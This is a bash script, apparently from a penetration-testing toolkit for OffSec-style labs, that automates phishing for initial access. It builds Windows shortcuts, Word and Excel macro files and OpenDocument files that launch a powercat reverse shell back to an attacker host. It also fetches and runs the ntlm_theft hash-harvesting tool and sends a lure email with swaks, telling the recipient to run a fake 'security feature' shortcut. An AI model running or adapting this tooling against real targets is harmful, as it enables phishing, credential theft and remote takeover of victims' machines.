#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/network.sh
source $SCRIPTDIR/reverse_shell.sh
source $SCRIPTDIR/.env

get_config_library() {
    if [[ -z "$http_ip" ]]; then
        echo "Please set the http ip first"
        return 1
    fi
    local config_file="config.Library-ms"
    cp $SCRIPTDIR/../xml/$config_file .
    sed -E -i 's/\{http_ip\}/'$http_ip'/g' $config_file
    sed -E -i 's/\{http_port\}/'$http_port'/g' $config_file
}

generate_windows_shortcut() {
    if [[ -z "$cmd" ]] && [[ -z "$use_icon_location" ]]; then
        cmd=$(get_powercat_reverse_shell)
    else
        echo "Using cmd=$cmd"
    fi
    if [[ -z "$shortcut_name" ]]; then
        shortcut_name=$1
        if [[ -z "$shortcut_name" ]]; then
            shortcut_name="automatic_configuration.lnk"
        fi
    fi
    cp $SCRIPTDIR/../ps1/windows_shortcut.ps1 .
    #local target_path="${cmd%% *}"
    #local arguments="${cmd#* }"
    #target_path=$(escape_sed "$target_path")
    local arguments="$cmd"
    local target_path=""
    if [[ ! -z $use_icon_location ]] && [[ $use_icon_location == "true" ]]; then
        target_path="%WINDIR%"
        arguments=""
        icon_location="\\\\$host_ip\\tools\\nc.ico"
        sed -E -i 's/#\$shortcut\.IconLocation/$shortcut.IconLocation/g' windows_shortcut.ps1
     else
        #take note, there is a 260 maximum shortcut target limit     
        target_path="cmd.exe"
        arguments="/c $cmd"
        icon_location=""
        sed -E -i '/\$shortcut\.IconLocation/d' windows_shortcut.ps1
    fi
    icon_location=$(escape_sed "$icon_location")
    sed -E -i 's/\{icon_location\}/'"$icon_location"'/g' windows_shortcut.ps1
    target_path=$(escape_sed "$target_path")
    sed -E -i 's/\{target_path\}/'"$target_path"'/g' windows_shortcut.ps1
    arguments=$(escape_sed "$arguments")
    sed -E -i 's/\{arguments\}/'"$arguments"'/g' windows_shortcut.ps1
    sed -E -i 's/\{shortcut_name\}/'"$shortcut_name"'/g' windows_shortcut.ps1
    local run_shortcut=$(cat windows_shortcut.ps1)
    run_shortcut=$(encode_powershell "$run_shortcut")
    ssh $windows_username@$windows_computername "$run_shortcut"
    if [[ ! -d "shortcuts" ]]; then
        mkdir shortcuts
    fi
    scp "$windows_username@$windows_computername:c:/users/$windows_username/$shortcut_name" shortcuts
    cp "shortcuts/$shortcut_name" . # offsec might expect it in this location rather than looking at the actual URL
}

run_ntlm_theft() {

    local url="https://github.com/Greenwolf/ntlm_theft/archive/refs/heads/master.zip"
    if [[ ! -d ntlm_theft ]]; then
        echo "Downloading ntlm_theft tool."
        wget $url -O ntlm_theft.zip
        unzip ntlm_theft.zip -d .
        mv ntlm_theft-master ntlm_theft
        rm ntlm_theft.zip
    else
        echo "ntlm_theft directory already exists, skipping download."

    fi
    if [[ -z "$host_ip" ]]; then
        echo "Host IP is not set."
        return 1
    fi    
    pushd ntlm_theft || exit 1
    python3 ntlm_theft.py -s $host_ip -g all -f test
    popd || exit 1

}
send_phishing_email() {

    if [[ -z "$attachment_type" ]]; then
        attachment_type="shortcut"
    fi
    local attach_type_option=""
    if [[ "$attachment_type" == "shortcut" ]]; then
        get_config_library
        generate_windows_shortcut
        attachment=config.Library-ms
    elif [[ "$attachment_type" == "doc" ]]; then
        get_word_macro
        attach_type_option="--attach-type application/msword"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Word attachment first."
            return 1
        fi
    elif [[ "$attachment_type" == "xls" ]]; then
        get_xls_macro
        attach_type_option="--attach-type application/vnd.ms-excel"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Excel attachment first."
            return 1
        fi
    elif [[ "$attachment_type" == "xlsm" ]]; then
        get_xls_macro
        attach_type_option="--attach-type application/vnd.ms-excel.sheet.macroEnabled.12"
        if [[ -z "$attachment" ]] || [[ ! -f "$attachment" ]]; then
            echo "Attachment file not found. Please generate the Excel attachment first."
            return 1
        fi
    elif [[ "$attachment_type" == "odt" ]]; then
        generate_odt
        attach_type_option="--attach-type application/vnd.oasis.opendocument.text"
        attachment=output.odt
    elif [[ "$attachment_type" == "ods" ]]; then
        generate_ods
        attach_type_option="--attach-type application/vnd.oasis.opendocument.spreadsheet"
        attachment=output.ods
    fi
    if [[ -z "$target_email" ]]; then
        echo "Target email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$sender_email" ]]; then
        echo "Sender email is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_server" ]]; then
        echo "SMTP server is not set. Please set it before sending the email."
        return 1
    fi
    if [[ -z "$smtp_username" ]]; then
        echo "SMTP username is not set. Ensure that this is your intention."
    fi
    if [[ -z "$smtp_password" ]]; then
        echo "SMTP password is not set. Ensure that this is your intention"
    fi
    if [[ -z "$email_header" ]]; then
        echo "Creating email header file."
        email_header="Subject: Staging Script"
    fi
    if [[ ! -f email_body.txt ]]; then
        echo "Creating email body file."
        echo "Hey!" > email_body.txt
        echo "Please install the new security feature for your workstation" >> email_body.txt
        echo "For this, download the attachment file, double-click on it, and execute the configuration shortcut within. Thanks!" >> email_body.txt
    fi
    local smtp_authentication=""
    if [[ ! -z "$smtp_username" ]] && [[ ! -z "$smtp_password" ]]; then
        smtp_authentication="--auth LOGIN --auth-user $smtp_username --auth-password $smtp_password"
    fi
    local proxychain_command=""
    if [[ ! -z $use_proxychain ]] && [[ $use_proxychain == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Using proxychains for sending email."
    else
        proxychain_command=""
    fi
    local attachment_option="--attach @$attachment"
    if [[ $attachment_type == "hyperlink" ]]; then
        attachment_option=""
    fi
    ${proxychain_command}swaks -t $target_email --from $sender_email $attach_type_option $attachment_option --header "$email_header" --body @email_body.txt $swaks_additional_options --server $smtp_server $smtp_authentication
}

get_word_macro() {
    if [[ -z $cmd ]]; then
        background_shell=false
        cmd=$(get_powercat_reverse_shell)
    fi
    cp $SCRIPTDIR/../python/generate_macro.py .
    python3 generate_macro.py doc "$cmd"

}

get_xls_macro() {
    if [[ -z $cmd ]]; then
        background_shell=false
        cmd=$(get_powercat_reverse_shell)
    fi
    cp $SCRIPTDIR/../python/generate_macro.py .
    python3 generate_macro.py xls "$cmd"

}

generate_odt() {
    echo "Generating ODT file with reverse shell payload."
    cp $SCRIPTDIR/../python/generate_od.py .
    cp $SCRIPTDIR/../xml/content.xml .
    cp $SCRIPTDIR/../xml/manifest.xml .
    cp $SCRIPTDIR/../xml/script-lb.xml .
    cp $SCRIPTDIR/../xml/script-lc.xml .
    generate_windows_shortcut
    python3 generate_od.py output.odt "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"

}

generate_ods() {
    echo "Generating ODS file with reverse shell payload."
    cp $SCRIPTDIR/../python/generate_od.py .
    cp $SCRIPTDIR/../xml/content_ods.xml content.xml
    cp $SCRIPTDIR/../xml/manifest.xml .
    cp $SCRIPTDIR/../xml/script-lb.xml .
    cp $SCRIPTDIR/../xml/script-lc.xml .    
    sed -E -i 's/opendocument\.text/opendocument\.spreadsheet/g' manifest.xml
    generate_windows_shortcut
    python3 generate_od.py output.ods "http://$http_ip:$http_port/shortcuts/$shortcut_name" "$cmd"

}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    if [[ -z "$windows_username" ]] || [[ -z "$windows_computername" ]]; then
        echo "Windows username and computer name must be set before running this script."
        exit 1
    fi
    if [[ "$1" == "get_config_library" ]]; then
        host_ip=127.0.0.1
        get_config_library
        exit 0
    elif [[ "$1" == "generate_windows_shortcut" ]]; then
        host_ip=127.0.0.1
        http_ip=127.0.0.1
        generate_windows_shortcut "$2"
        exit 0
    fi
    echo "Usage: $0 {get_config_library|generate_windows_shortcut [shortcut_name]}"
fi